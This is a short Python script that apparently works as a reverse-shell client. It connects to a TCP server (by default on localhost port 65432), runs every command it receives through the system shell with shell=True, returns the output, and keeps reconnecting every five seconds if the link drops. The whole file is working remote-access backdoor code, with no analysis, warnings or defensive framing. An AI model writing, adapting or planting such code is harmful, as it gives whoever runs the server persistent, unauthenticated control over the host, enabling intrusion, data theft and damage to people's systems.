import socket
import subprocess
import time
from concurrent.futures import ThreadPoolExecutor

def connect_to_server(host, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((host, port))
        print(f"Connected to server at {host}:{port}")
        return client
    except socket.error as e:
        print(f"Failed to connect to server: {e}")
        return None

def execute_command(command):
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate(timeout=5)
        output = stdout + stderr
    except subprocess.TimeoutExpired:
        output = "Command started (possibly GUI application) and is running in the background."
    except Exception as e:
        output = str(e)
    return output

def start_client(host='127.0.0.1', port=65432):
    while True:
        client = connect_to_server(host, port)
        if client:
            try:
                while True:
                    command = client.recv(4096).decode('utf-8')
                    if command.lower() == 'exit':
                        print("Connection closed by server.")
                        client.close()
                        return
                    if command:
                        with ThreadPoolExecutor() as executor:
                            future = executor.submit(execute_command, command)
                            output = future.result()
                        client.send(output.encode('utf-8'))
            except (socket.error, KeyboardInterrupt):
                print("Connection lost. Reconnecting...")
                client.close()
        time.sleep(5)  # Wait for 5 seconds before attempting to reconnect

if __name__ == "__main__":
    start_client()
